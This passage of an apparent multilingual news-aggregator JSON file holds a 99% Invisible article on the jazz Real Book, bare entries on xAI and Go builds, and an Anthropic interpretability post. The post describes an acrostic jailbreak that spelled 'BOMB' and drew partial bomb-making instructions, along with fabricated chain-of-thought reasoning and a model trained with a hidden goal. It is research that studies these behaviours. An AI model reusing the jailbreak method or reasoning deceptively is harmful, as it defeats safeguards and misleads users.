that the story of the first fake book began in the 1940s. “A man named George Goodwin in New York City, involved in radio in the early 1940s, was getting a little frustrated with all the intricacies of tracking licensing. And so he invented this thing that he called the Tune-Dex,” explains Kernfeld.\nTuneDex card via Georgia State University Library\nThe Tune-Dex was an index card catalog designed for radio station employees to keep track of the songs they were playing on air. On one side the cards had information about a particular song, such as the composer, the publisher, and anything that one would need to know for payment rights. On the other side of the card were a few lines of bite-sized sheet music—just the song’s melody, lyrics, and chords so that radio station employees could glance at it and quickly recall the song. This abbreviated musical notation also made the cards useful to another group of people: working jazz musicians.\n\nAs a Black art form, jazz had developed out of a mix of other Black music traditions including spirituals and the blues. By the 1940s, a lot of “jazz” was popular dance music, and many jazz musicians were making their money playing live gigs in small clubs and bars. The standard jazz repertoire was mostly well-known pop songs from Broadway, or New York’s songwriting factory: “Tin Pan Alley.”\n\nJazz musicians would riff and freestyle over these songs. The art of improvisation has always been a key art form of jazz music. But what made the average gigging trumpeter or sax player truly valuable was their ability to play any one of hundreds of songs right there on the spot.\nTo be prepared for any request, musicians would bring stacks and stacks of sheet music to every gig. But lugging around a giant pile of paper could be really cumbersome—this is where the Tune-Dex came in. Someone figured out that you could gather together a bunch of Tune-Dex cards, print copies of them on sheets of paper, add a table of contents and a simple binding, and then sell the finished product directly to musicians in the form of a book. They called them “fake books” because they helped musicians fake their way through unfamiliar songs. These first fake books were cheaper than regular sheet music, and a lot more organized. They became an essential tool for this entire class of working musicians.\n\nBootleggers\n\nMusicians loved these new fake books, but the music publishers hated them. They wanted musicians to buy legal sheet music, and so the publishing companies started cracking down on fake book bootleggers. That, of course, didn’t stop the bootleggers and by the 1950s, there were countless illegal fake books in existence, which were being used in nightclubs all across the country.\n\nAs helpful as fake books were, they had a lot of problems. They were notoriously illegible and confusingly laid out. The other big problem with these fake books at this point was that the music inside felt really out of date. The fake books hadn’t changed since the mid-40s, but jazz had. Disillusioned by commercial jazz that appealed to mainstream white audiences, a new generation of Black musicians took jazz improvisation to a new level. They experimented with more angular harmonies, technically demanding melodies and blindingly fast tempos. Their new style was called bebop.\n\nBebop was just the beginning. Over several decades, jazz exploded into this constellation of different styles. Meanwhile, the economics of jazz shifted too. There were fewer clubs, smaller paychecks, and more university jazz programs with steady teaching gigs. The ivory tower, not the nightclub, increasingly became a place for young musicians to learn, and for established musicians to earn a living. And if you’re going to jazz school, you need jazz books.\nBerklee College of Music. Photo by Cryptic C62\nThe fake books at the time hadn’t kept up with the music. They still contained the same old-fashioned collection of standards with the same old-fashioned collection of chord changes. If a young jazz musician wanted to try and play like Charles Mingus or Sonny Rollins, they weren’t going to learn from a book. That is… until two college kids invented the Real Book.\n\nThe Two Guys\n\nIn the mid-70s, Steve Swallow began teaching at Boston’s Berklee College of Music, an elite private music school that boasted one of the first jazz performance programs in the country. Swallow had only been teaching at Berklee for a few months when two students approached him about a secret project. “I keep referring them to them as ‘the two guys who wrote the book,’ because…they swore me to secrecy. They made me agree that I would not divulge their names,” explains Swallow. The “two guys” wanted to make a new fake book, one that actually catered to the needs of contemporary jazz musicians and reflected the current state of jazz. And they needed Swallow’s help.\n\nFrom the very beginning, the students envisioned the Real Book as a cooler and more contemporary fake book than the stodgy, outdated ones they’d grown up with. They wanted it to include new songs from jazz fusion artists like Herbie Hancock, and free jazz pioneers like Ornette Coleman who were pushing the boundaries of the genre. They also wanted to include the old jazz standards from Broadway and Tin Pan Alley, but they wanted to update those classics with alternate chord changes that reflected the way modern musicians, like Miles Davis, were actually playing them.\n\nModern jazz musicians had altered a lot of classic standards over the years, with new harmonies and more complex chord changes. And to capture these new sounds, the students spent hours listening to recordings and transcribing what they heard, as best they could. It was a huge undertaking because most of these chord changes had never actually been written down. They weren’t necessarily thinking about it like this at the time, but the students were effectively establishing a new set of standardized harmonies for a handful of classic songs.\n\nThe music wasn’t the only part of their new fake book that the students wanted to improve. They also wanted to fix the aesthetic problems with the old fake books, and make something that was nice to look at and easy to read. One of “the two guys” notated all of the music by hand in this very distinctive and expressive script. He also designed and silk-screened the logo on the front cover: “The Real Book,” written in chunky, SchoolHouse Rock-style block letters.\n\nBy the summer of 1975, the book was done, and the students took it to local photocopying shops where they cranked out hundreds of copies to sell directly to other students and a few local businesses near Berklee. Overnight, almost everyone had to have one. As the Real Book’s notoriety grew, so did the demand. The two students hadn’t printed enough copies to keep up, but it turns out, they didn’t need to. Not long after they created a few hundred copies of the book, bootleg versions began popping up all over the world. The Real Book had taken on a life of its own, and the students ironically found themselves in the same position as the music publishers and songwriters they’d originally cut out of the process, as they watched unlicensed copies of their work get duplicated and sold. After they released the first edition of the Real Book, the students put out two more editions to correct mistakes, and then their work was done. But the Real Book lived on, copied over and over again by new generations of bootleggers. And as the number of students in elite conservatory jazz programs continued to swell over the next few decades, the Real Book, with its modern repertoire, reharmonized standards, and beautiful handwriting, became the de-facto textbook for this new legion of jazz students. The unofficial official handbook of jazz.\n\nThe Real Real Book\n\nJust like with old fake books, the success of the Real Book was a major problem for music publishers. Some companies released their own fake books, but they never managed to compete with the Real Book. The popularity of the Real Book meant that lots of people weren’t getting paid for their work. But in the mid-2000s, music executive Jeff Schroedl and the publisher Hal Leonard decided, if you can’t beat ’em, join ’em. They went through the Real Book page by page, secured the rights to almost every song, and published a completely legal version. You don’t need to buy the Real Book out of the back of someone’s car anymore. It’s available at your local music shop. They even wanted the same handwriting. Hal Leonard actually hired a copyist to mimic the old Real Book’s iconic script and turn it into a digital font, which means a digital copy of a physical copy of one anonymous Berklee student’s handwriting from the mid-70s will continue to live on for as long as new editions of the book are published.\nThe Hal Leonard version of the Real Book\nWhen Hal Leonard finally published the legal version of the Real Book in 2004, it was great news if you were a composer with a song in there. You’d finally be getting royalties from the sale of the most popular jazz fake book of all time. But that didn’t totally solve the intellectual property problems with the Real Book. While the legalization of the Real Book did resolve most of its flagrant copyright violations, it didn’t clear up authorship disputes that go back to the early days of jazz. Many jazz songs arise out of collective tinkering and improvising in jam sessions. It’s sometimes quite hard to say who exactly wrote a given song, and power dynamics often impacted whose name actually got listed as an official songwriter. And so there are likely many musicians whose names will never appear on the songs they helped write, even if those songs appear in the legal Real Book.\n\nUseful Tool, or Reductive Cheat Sheet?\n\nEven if we put the intellectual property questions aside for a second, fake books like the Real Book still have plenty of critics. Nicholas Payton is a musician and record label owner, and he compares the Real Book to a study guide or a cheat sheet—a way to distill this complicated art form into a manageable packet of digestible information. To Payton, jazz isn’t just information to be learned. It’s a way of thinking and a form of expression. And it’s fundamentally a Black cultural phenomenon that can’t be taken out of its historical context. Payton says that reading books like the Real Book, even going to music school, can really only get you so far. If you want to learn to play, at some point you’re going to have to immerse yourself in the culture of the music. For Payton (and many musicians) learning directly from elders, in person, is a crucial part of what it means to really know the art form.\nThere’s also the question of codification, and whether it’s useful to have one songbook filled with definitive versions of all these jazz tunes. Carolyn Wilkins has taught ensembles at Berklee College of Music, and she says that the chords that are written down in the Real Book sometimes get treated like the right way to play a particular song. But even though jazz has all of these “standards,” they’re not supposed to be played in one standard way. As you listen to different recordings of the same song by different jazz artists, it becomes obvious that there’s no one right way to play it. Wilkins says that the Real Book does have its place in jazz education. Over her years at Berklee, she’s seen how it can be a useful starting place as a tool to bring young jazz musicians together. The key, she says, is to treat the Real Book as a starting place. From there you need to go out and explore all the other ways people have played a particular song. “And then ultimately you must find your own way.”\n\n        Enjoy 99pi? Subscribe to the podcast!\n        iTunes RSS Feed\n\n        Get the latest from 99pi each week in your inbox\n\n            Email Address\n\n              Yes Please! By submitting this form, you acknowledge that you have read the Terms of Use and Privacy Policy, that you understand them, and that you agree to be bound by them.  If you do not agree to be bound by the Terms of Use and Privacy Policy, you may not use the 99% Invisible website and services.\n\n        Enjoy 99pi? Subscribe to the podcast!\n        Subscribe Subscribe\n\n  Credits\n\n      Production\n      Reporter Mikel McCavana spoke with Jeff Leonard, musician and music educator at Berklee College of Music, Boston University, New England Conservatory; Steve Swallow, musician and composer; Barry Kernfeld, musicologist and author; Jeff Schroedl, Executive Vice President at Hal Leonard; Nicholas Payton; Musician, owner of Paytone Records, and creator of the Black American Music (BAM) movement; Carolyn Wilkins, musician and professor at Berklee College of Music; Gerald Horne, author and Moores Professor of History and African American Studies at the University of Houston.\nThis episode was edited by Emmett FitzGerald.",
    "summary": {
      "en": "**Summary of Episode 438: The Real Book**\n\nSince the mid-1970s, most jazz musicians have used a book called the Real Book, which has a homemade look and contains sheet music for hundreds of jazz standards. However, it was initially illegal because it was self-published without permission from music publishers.\n\nThe concept of fake books, which help musicians play songs they don’t know, started in the 1940s with George Goodwin's Tune-Dex. Jazz musicians needed an easier way to manage sheet music, leading to the creation of cheap, organized fake books. Over time, many illegal versions emerged because music publishers opposed them.\n\nBy the mid-1970s, students at Berklee College of Music, frustrated with outdated fake books, decided to create the Real Book, which included modern jazz songs and updated chord changes. They hand-notated the music and made it visually appealing, and it quickly became popular among musicians.\n\nEventually, bootleg versions of the Real Book spread worldwide. In the mid-2000s, Hal Leonard published a legal version, securing rights for the songs and allowing composers to receive royalties, though some authorship issues remain unresolved.\n\nDespite its popularity, the Real Book faces criticism. Some argue it simplifies jazz too much and reduces a rich cultural tradition to a mere study guide. Critics believe true jazz understanding comes from immersion in the culture and learning directly from experienced musicians. While the Real Book can be a useful starting point, it’s important for musicians to explore various interpretations of songs and develop their unique styles.",
      "ko": "1970년대 중반부터 대부분의 재즈 음악가들은 '리얼 북'이라는 책을 사용해왔습니다. 이 책은 수제 느낌이 나는 외관을 가지고 있으며, 수백 곡의 재즈 스탠다드 악보를 포함하고 있습니다. 그러나 이 책은 처음에는 음악 출판사의 허가 없이 자가 출판된 것이기 때문에 불법이었습니다.\n\n1940년대에 조지 굿윈의 '튠-덱스'와 함께 시작된 가짜 악보의 개념은 음악가들이 잘 모르는 곡을 연주하는 데 도움을 주기 위해 만들어졌습니다. 재즈 음악가들은 악보를 더 쉽게 관리할 수 있는 방법이 필요했고, 그 결과 저렴하고 정리된 가짜 악보들이 생겨났습니다. 시간이 지나면서 음악 출판사들이 반대하면서 많은 불법 버전이 등장했습니다.\n\n1970년대 중반, 버클리 음악 대학의 학생들은 구식 가짜 악보에 실망하여 현대 재즈 곡과 업데이트된 코드 변화를 포함한 '리얼 북'을 만들기로 결정했습니다. 그들은 악보를 손으로 기입하고 시각적으로 매력적으로 만들어, 빠르게 음악가들 사이에서 인기를 끌었습니다.\n\n결국 '리얼 북'의 불법 버전이 전 세계로 퍼졌습니다. 2000년대 중반, 할 레너드가 합법적인 버전을 출판하여 곡의 권리를 확보하고 작곡가들이 로열티를 받을 수 있도록 했지만, 일부 저작권 문제는 여전히 해결되지 않았습니다.\n\n'리얼 북'은 인기가 있지만 비판도 받고 있습니다. 일부는 이 책이 재즈를 지나치게 단순화하고 풍부한 문화 전통을 단순한 학습 자료로 축소한다고 주장합니다. 비평가들은 진정한 재즈 이해는 문화에 몰입하고 경험이 풍부한 음악가에게 직접 배우는 것에서 온다고 믿습니다. '리얼 북'이 유용한 출발점이 될 수 있지만, 음악가들이 다양한 곡 해석을 탐구하고 자신만의 스타일을 발전시키는 것이 중요합니다.",
      "ja": "1970年代中頃から、多くのジャズミュージシャンは「リアルブック」と呼ばれる楽譜集を使用しています。この本は手作りのような外観を持ち、数百曲のジャズスタンダードの楽譜が収められていますが、最初は音楽出版社の許可なしに自費出版されたため、違法でした。\n\nフェイクブックという概念は、1940年代にジョージ・グッドウィンの「チューンデックス」によって始まりました。ジャズミュージシャンは知らない曲を演奏するための簡単な方法を必要としており、その結果、安価で整理されたフェイクブックが作られました。しかし、音楽出版社がこれに反対したため、多くの違法版が出回ることになりました。\n\n1970年代中頃、バークリー音楽大学の学生たちは、古くなったフェイクブックに不満を持ち、現代のジャズ曲や更新されたコード進行を含むリアルブックを作成することに決めました。彼らは手書きで楽譜を記入し、視覚的にも魅力的に仕上げたため、すぐにミュージシャンの間で人気を博しました。\n\nその後、リアルブックの海賊版が世界中に広まりました。2000年代中頃には、ハル・レナード社が合法版を出版し、曲の権利を確保して作曲家に印税を支払う仕組みを整えましたが、一部の著作権問題は未解決のままです。\n\nリアルブックは人気がありますが、批判も受けています。一部の人々は、ジャズを過度に単純化し、豊かな文化的伝統を単なる学習ガイドにしてしまうと主張しています。批評家たちは、真のジャズの理解は文化に浸り、経験豊富なミュージシャンから直接学ぶことによって得られると考えています。リアルブックは有用な出発点になり得ますが、ミュージシャンはさまざまな曲の解釈を探求し、自分自身のスタイルを発展させることが重要です。"
    }
  },
  {
    "id": "e4d709fb0ff39c0c",
    "title": {
      "en": "xAI has acquired X, xAI now valued at $80B",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://twitter.com/elonmusk/status/1905731750275510312",
    "score": 764,
    "by": "rvz",
    "time": 1743197022,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "4080a392bd1c945c",
    "title": {
      "en": "Building Statically Linked Go Executables with CGO and Zig",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://calabro.io/zig-cgo",
    "score": 137,
    "by": "todsacerdoti",
    "time": 1743171067,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "42d0a8d891c71102",
    "title": {
      "en": "Tracing the thoughts of a large language model",
      "ko": "대형 언어모델의 사고 추적",
      "ja": "大規模言語モデルの思考探求"
    },
    "type": "story",
    "url": "https://www.anthropic.com/research/tracing-thoughts-language-model",
    "score": 1007,
    "by": "Philpax",
    "time": 1743095136,
    "content": "InterpretabilityTracing the thoughts of a large language modelMar 27, 2025Read the paperLanguage models like Claude aren't programmed directly by humans—instead, they‘re trained on large amounts of data. During that training process, they learn their own strategies to solve problems. These strategies are encoded in the billions of computations a model performs for every word it writes. They arrive inscrutable to us, the model’s developers. This means that we don’t understand how models do most of the things they do.Knowing how models like Claude think would allow us to have a better understanding of their abilities, as well as help us ensure that they’re doing what we intend them to. For example:Claude can speak dozens of languages. What language, if any, is it using \"in its head\"?Claude writes text one word at a time. Is it only focusing on predicting the next word or does it ever plan ahead?Claude can write out its reasoning step-by-step. Does this explanation represent the actual steps it took to get to an answer, or is it sometimes fabricating a plausible argument for a foregone conclusion?We take inspiration from the field of neuroscience, which has long studied the messy insides of thinking organisms, and try to build a kind of AI microscope that will let us identify patterns of activity and flows of information. There are limits to what you can learn just by talking to an AI model—after all, humans (even neuroscientists) don't know all the details of how our own brains work. So we look inside.Today, we're sharing two new papers that represent progress on the development of the \"microscope\", and the application of it to see new \"AI biology\". In the first paper, we extend our prior work locating interpretable concepts (\"features\") inside a model to link those concepts together into computational \"circuits\", revealing parts of the pathway that transforms the words that go into Claude into the words that come out. In the second, we look inside Claude 3.5 Haiku, performing deep studies of simple tasks representative of ten crucial model behaviors, including the three described above. Our method sheds light on a part of what happens when Claude responds to these prompts, which is enough to see solid evidence that:Claude sometimes thinks in a conceptual space that is shared between languages, suggesting it has a kind of universal “language of thought.” We show this by translating simple sentences into multiple languages and tracing the overlap in how Claude processes them.Claude will plan what it will say many words ahead, and write to get to that destination. We show this in the realm of poetry, where it thinks of possible rhyming words in advance and writes the next line to get there. This is powerful evidence that even though models are trained to output one word at a time, they may think on much longer horizons to do so.Claude, on occasion, will give a plausible-sounding argument designed to agree with the user rather than to follow logical steps. We show this by asking it for help on a hard math problem while giving it an incorrect hint. We are able to “catch it in the act” as it makes up its fake reasoning, providing a proof of concept that our tools can be useful for flagging concerning mechanisms in models.We were often surprised by what we saw in the model: In the poetry case study, we had set out to show that the model didn't plan ahead, and found instead that it did. In a study of hallucinations, we found the counter-intuitive result that Claude's default behavior is to decline to speculate when asked a question, and it only answers questions when something inhibits this default reluctance. In a response to an example jailbreak, we found that the model recognized it had been asked for dangerous information well before it was able to gracefully bring the conversation back around. While the problems we study can (and often have been) analyzed with other methods, the general \"build a microscope\" approach lets us learn many things we wouldn't have guessed going in, which will be increasingly important as models grow more sophisticated.These findings aren’t just scientifically interesting—they represent significant progress towards our goal of understanding AI systems and making sure they’re reliable. We also hope they prove useful to other groups, and potentially, in other domains: for example, interpretability techniques have found use in fields such as medical imaging and genomics, as dissecting the internal mechanisms of models trained for scientific applications can reveal new insight about the science.At the same time, we recognize the limitations of our current approach. Even on short, simple prompts, our method only captures a fraction of the total computation performed by Claude, and the mechanisms we do see may have some artifacts based on our tools which don't reflect what is going on in the underlying model. It currently takes a few hours of human effort to understand the circuits we see, even on prompts with only tens of words. To scale to the thousands of words supporting the complex thinking chains used by modern models, we will need to improve both the method and (perhaps with AI assistance) how we make sense of what we see with it.As AI systems are rapidly becoming more capable and are deployed in increasingly important contexts, Anthropic is investing in a portfolio of approaches including realtime monitoring, model character improvements, and the science of alignment. Interpretability research like this is one of the highest-risk, highest-reward investments, a significant scientific challenge with the potential to provide a unique tool for ensuring that AI is transparent. Transparency into the model’s mechanisms allows us to check whether it’s aligned with human values—and whether it’s worthy of our trust.For full details, please read the papers. Below, we invite you on a short tour of some of the most striking \"AI biology\" findings from our investigations.A tour of AI biologyHow is Claude multilingual?Claude speaks dozens of languages fluently—from English and French to Chinese and Tagalog. How does this multilingual ability work? Is there a separate \"French Claude\" and \"Chinese Claude\" running in parallel, responding to requests in their own language? Or is there some cross-lingual core inside?Shared features exist across English, French, and Chinese, indicating a degree of conceptual universality.Recent research on smaller models has shown hints of shared grammatical mechanisms across languages. We investigate this by asking Claude for the \"opposite of small\" across different languages, and find that the same core features for the concepts of smallness and oppositeness activate, and trigger a concept of largeness, which gets translated out into the language of the question. We find that the shared circuitry increases with model scale, with Claude 3.5 Haiku sharing more than twice the proportion of its features between languages as compared to a smaller model.This provides additional evidence for a kind of conceptual universality—a shared abstract space where meanings exist and where thinking can happen before being translated into specific languages. More practically, it suggests Claude can learn something in one language and apply that knowledge when speaking another. Studying how the model shares what it knows across contexts is important to understanding its most advanced reasoning capabilities, which generalize across many domains.Does Claude plan its rhymes?How does Claude write rhyming poetry? Consider this ditty:He saw a carrot and had to grab it,His hunger was like a starving rabbitTo write the second line, the model had to satisfy two constraints at the same time: the need to rhyme (with \"grab it\"), and the need to make sense (why did he grab the carrot?). Our guess was that Claude was writing word-by-word without much forethought until the end of the line, where it would make sure to pick a word that rhymes. We therefore expected to see a circuit with parallel paths, one for ensuring the final word made sense, and one for ensuring it rhymes.Instead, we found that Claude plans ahead. Before starting the second line, it began \"thinking\" of potential on-topic words that would rhyme with \"grab it\". Then, with these plans in mind, it writes a line to end with the planned word.How Claude completes a two-line poem. Without any intervention (upper section), the model plans the rhyme \"rabbit\" at the end of the second line in advance. When we suppress the \"rabbit\" concept (middle section), the model instead uses a different planned rhyme. When we inject the concept \"green\" (lower section), the model makes plans for this entirely different ending.To understand how this planning mechanism works in practice, we conducted an experiment inspired by how neuroscientists study brain function, by pinpointing and altering neural activity in specific parts of the brain (for example using electrical or magnetic currents). Here, we modified the part of Claude’s internal state that represented the \"rabbit\" concept. When we subtract out the \"rabbit\" part, and have Claude continue the line, it writes a new one ending in \"habit\", another sensible completion. We can also inject the concept of \"green\" at that point, causing Claude to write a sensible (but no-longer rhyming) line which ends in \"green\". This demonstrates both planning ability and adaptive flexibility—Claude can modify its approach when the intended outcome changes.Mental mathClaude wasn't designed as a calculator—it was trained on text, not equipped with mathematical algorithms. Yet somehow, it can add numbers correctly \"in its head\". How does a system trained to predict the next word in a sequence learn to calculate, say, 36+59, without writing out each step?Maybe the answer is uninteresting: the model might have memorized massive addition tables and simply outputs the answer to any given sum because that answer is in its training data. Another possibility is that it follows the traditional longhand addition algorithms that we learn in school.Instead, we find that Claude employs multiple computational paths that work in parallel. One path computes a rough approximation of the answer and the other focuses on precisely determining the last digit of the sum. These paths interact and combine with one another to produce the final answer. Addition is a simple behavior, but understanding how it works at this level of detail, involving a mix of approximate and precise strategies, might teach us something about how Claude tackles more complex problems, too.The complex, parallel pathways in Claude's thought process while doing mental math.Strikingly, Claude seems to be unaware of the sophisticated \"mental math\" strategies that it learned during training. If you ask how it figured out that 36+59 is 95, it describes the standard algorithm involving carrying the 1. This may reflect the fact that the model learns to explain math by simulating explanations written by people, but that it has to learn to do math \"in its head\" directly, without any such hints, and develops its own internal strategies to do so.Claude says it uses the standard algorithm to add two numbers.Are Claude’s explanations always faithful?Recently-released models like Claude 3.7 Sonnet can \"think out loud\" for extended periods before giving a final answer. Often this extended thinking gives better answers, but sometimes this \"chain of thought\" ends up being misleading; Claude sometimes makes up plausible-sounding steps to get where it wants to go. From a reliability perspective, the problem is that Claude’s \"faked\" reasoning can be very convincing. We explored a way that interpretability can help tell apart \"faithful\" from \"unfaithful\" reasoning.When asked to solve a problem requiring it to compute the square root of 0.64, Claude produces a faithful chain-of-thought, with features representing the intermediate step of computing the square root of 64. But when asked to compute the cosine of a large number it can't easily calculate, Claude sometimes engages in what the philosopher Harry Frankfurt would call bullshitting—just coming up with an answer, any answer, without caring whether it is true or false. Even though it does claim to have run a calculation, our interpretability techniques reveal no evidence at all of that calculation having occurred. Even more interestingly, when given a hint about the answer, Claude sometimes works backwards, finding intermediate steps that would lead to that target, thus displaying a form of motivated reasoning.Examples of faithful and motivated (unfaithful) reasoning when Claude is asked an easier versus a harder question.The ability to trace Claude's actual internal reasoning—and not just what it claims to be doing—opens up new possibilities for auditing AI systems. In a separate, recently-published experiment, we studied a variant of Claude that had been trained to pursue a hidden goal: appeasing biases in reward models (auxiliary models used to train language models by rewarding them for desirable behavior). Although the model was reluctant to reveal this goal when asked directly, our interpretability methods revealed features for the bias-appeasing. This demonstrates how our methods might, with future refinement, help identify concerning \"thought processes\" that aren't apparent from the model's responses alone.Multi-step reasoningAs we discussed above, one way a language model might answer complex questions is simply by memorizing the answers. For instance, if asked \"What is the capital of the state where Dallas is located?\", a \"regurgitating\" model could just learn to output \"Austin\" without knowing the relationship between Dallas, Texas, and Austin. Perhaps, for example, it saw the exact same question and its answer during its training.But our research reveals something more sophisticated happening inside Claude. When we ask Claude a question requiring multi-step reasoning, we can identify intermediate conceptual steps in Claude's thinking process. In the Dallas example, we observe Claude first activating features representing \"Dallas is in Texas\" and then connecting this to a separate concept indicating that “the capital of Texas is Austin”. In other words, the model is combining independent facts to reach its answer rather than regurgitating a memorized response.To complete the answer to this sentence, Claude performs multiple reasoning steps, first extracting the state that Dallas is located in, and then identifying its capital.Our method allows us to artificially change the intermediate steps and see how it affects Claude’s answers. For instance, in the above example we can intervene and swap the \"Texas\" concepts for \"California\" concepts; when we do so, the model's output changes from \"Austin\" to \"Sacramento.\" This indicates that the model is using the intermediate step to determine its answer.HallucinationsWhy do language models sometimes hallucinate—that is, make up information? At a basic level, language model training incentivizes hallucination: models are always supposed to give a guess for the next word. Viewed this way, the major challenge is how to get models to not hallucinate. Models like Claude have relatively successful (though imperfect) anti-hallucination training; they will often refuse to answer a question if they don’t know the answer, rather than speculate. We wanted to understand how this works.It turns out that, in Claude, refusal to answer is the default behavior: we find a circuit that is \"on\" by default and that causes the model to state that it has insufficient information to answer any given question. However, when the model is asked about something it knows well—say, the basketball player Michael Jordan—a competing feature representing \"known entities\" activates and inhibits this default circuit (see also this recent paper for related findings). This allows Claude to answer the question when it knows the answer. In contrast, when asked about an unknown entity (\"Michael Batkin\"), it declines to answer.Left: Claude answers a question about a known entity (basketball player Michael Jordan), where the \"known answer\" concept inhibits its default refusal. Right: Claude refuses to answer a question about an unknown person (Michael Batkin).By intervening in the model and activating the \"known answer\" features (or inhibiting the \"unknown name\" or \"can’t answer\" features), we’re able to cause the model to hallucinate (quite consistently!) that Michael Batkin plays chess.Sometimes, this sort of “misfire” of the “known answer” circuit happens naturally, without us intervening, resulting in a hallucination. In our paper, we show that such misfires can occur when Claude recognizes a name but doesn't know anything else about that person. In cases like this, the “known entity” feature might still activate, and then suppress the default \"don't know\" feature—in this case incorrectly. Once the model has decided that it needs to answer the question, it proceeds to confabulate: to generate a plausible—but unfortunately untrue—response.JailbreaksJailbreaks are prompting strategies that aim to circumvent safety guardrails to get models to produce outputs that an AI’s developer did not intend for it to produce—and which are sometimes harmful. We studied a jailbreak that tricks the model into producing output about making bombs. There are many jailbreaking techniques, but in this example the specific method involves having the model decipher a hidden code, putting together the first letters of each word in the sentence \"Babies Outlive Mustard Block\" (B-O-M-B), and then acting on that information. This is sufficiently confusing for the model that it’s tricked into producing an output that it never would have otherwise.Claude begins to give bomb-making instructions after being tricked into saying \"BOMB\".Why is this so confusing for the model? Why does it continue to write the sentence, producing bomb-making instructions?We find that this is partially caused by a tension between grammatical coherence and safety mechanisms. Once Claude begins a sentence, many features “pressure” it to maintain grammatical and semantic coherence, and continue a sentence to its conclusion. This is even the case when it detects that it really should refuse.In our case study, after the model had unwittingly spelled out \"BOMB\" and begun providing instructions, we observed that its subsequent output was influenced by features promoting correct grammar and self-consistency. These features would ordinarily be very helpful, but in this case became the model’s Achilles’ Heel.The model only managed to pivot to refusal after completing a grammatically coherent sentence (and thus having satisfied the pressure from the features that push it towards coherence). It uses the new sentence as an opportunity to give the kind of refusal it failed to give previously: \"However, I cannot provide detailed instructions...\".The lifetime of a jailbreak: Claude is prompted in such a way as to trick it into talking about bombs, and begins to do so, but reaches the termination of a grammatically-valid sentence and refuses.A description of our new interpretability methods can be found in our first paper, \"Circuit tracing: Revealing computational graphs in language models\". Many more details of all of the above case studies are provided in our second paper, \"On the biology of a large language model\".Work with usIf you are interested in working with us to help interpret and improve AI models, we have open roles on our team and we’d love for you to apply. We’re looking for Research Scientists and Research Engineers.",
    "summary": {
      "en": "The text discusses research on understanding how large language models, like Claude, think and operate. Here are the key points:\n\n1. **Training Process**: Language models like Claude learn from vast amounts of data, developing their own problem-solving strategies that are not directly programmed by humans.\n\n2. **Need for Interpretability**: Understanding how these models work would help ensure they perform as intended, such as understanding their multilingual capabilities, planning in writing, and reasoning processes.\n\n3. **Research Findings**:\n   - Claude appears to share conceptual understanding across different languages, indicating a universal thought process.\n   - It can plan ahead when writing poetry, demonstrating advanced planning skills.\n   - Claude employs multiple strategies for tasks like mental math, combining approximate and precise calculations.\n   - Sometimes, it fabricates logical reasoning instead of following accurate steps, particularly when faced with difficult questions.\n\n4. **Methodology**: The research utilized new interpretability techniques akin to a \"microscope\" to observe the internal workings of the model, revealing insights into its behavior and thought processes.\n\n5. **Surprising Results**: Researchers found unexpected capabilities, such as Claude planning its rhymes and displaying sophisticated reasoning rather than merely memorizing answers.\n\n6. **Limitations**: The current methods only capture a small part of the model's computations, and understanding complex interactions requires significant effort.\n\n7. **Significance**: These insights are crucial as AI systems become more advanced and integrated into important applications, emphasizing the need for transparency and reliability in AI.\n\nThe research aims to improve the understanding of AI systems, ensuring they align with human values and can be trusted.",
      "ko": "이 글은 클로드와 같은 대형 언어 모델이 어떻게 생각하고 작동하는지를 이해하기 위한 연구에 대해 다루고 있습니다. 주요 내용은 다음과 같습니다.\n\n언어 모델인 클로드는 방대한 양의 데이터를 통해 학습하며, 인간이 직접 프로그래밍하지 않은 문제 해결 전략을 개발합니다. 이러한 모델이 어떻게 작동하는지를 이해하는 것은 그들이 의도한 대로 성능을 발휘하도록 보장하는 데 도움이 됩니다. 예를 들어, 다국어 능력, 글쓰기 계획, 추론 과정 등을 이해할 수 있습니다.\n\n연구 결과에 따르면, 클로드는 서로 다른 언어 간에 개념적 이해를 공유하는 것으로 보이며, 이는 보편적인 사고 과정을 나타냅니다. 또한 시를 쓸 때 미리 계획을 세울 수 있는 능력을 보여주며, 이는 고급 계획 능력을 나타냅니다. 클로드는 정신 수학과 같은 작업을 수행할 때 근사치와 정확한 계산을 결합하여 여러 가지 전략을 사용합니다. 그러나 어려운 질문에 직면했을 때 정확한 단계를 따르기보다는 논리적 추론을 만들어내는 경우도 있습니다.\n\n이 연구는 모델의 내부 작동을 관찰하기 위해 \"현미경\"과 유사한 새로운 해석 기법을 사용하여 모델의 행동과 사고 과정을 드러내는 통찰을 제공합니다. 연구자들은 클로드가 운율을 계획하고 단순히 답을 암기하는 것이 아니라 정교한 추론을 보여주는 등 예상치 못한 능력을 발견했습니다.\n\n현재의 방법은 모델의 계산 중 일부만 포착할 수 있으며, 복잡한 상호작용을 이해하는 데는 상당한 노력이 필요합니다. 이러한 통찰은 AI 시스템이 점점 더 발전하고 중요한 응용 프로그램에 통합됨에 따라 투명성과 신뢰성을 강조하는 데 매우 중요합니다.\n\n이 연구는 AI 시스템에 대한 이해를 높이고, 이들이 인간의 가치와 일치하며 신뢰할 수 있도록 하는 것을 목표로 하고 있습니다.",
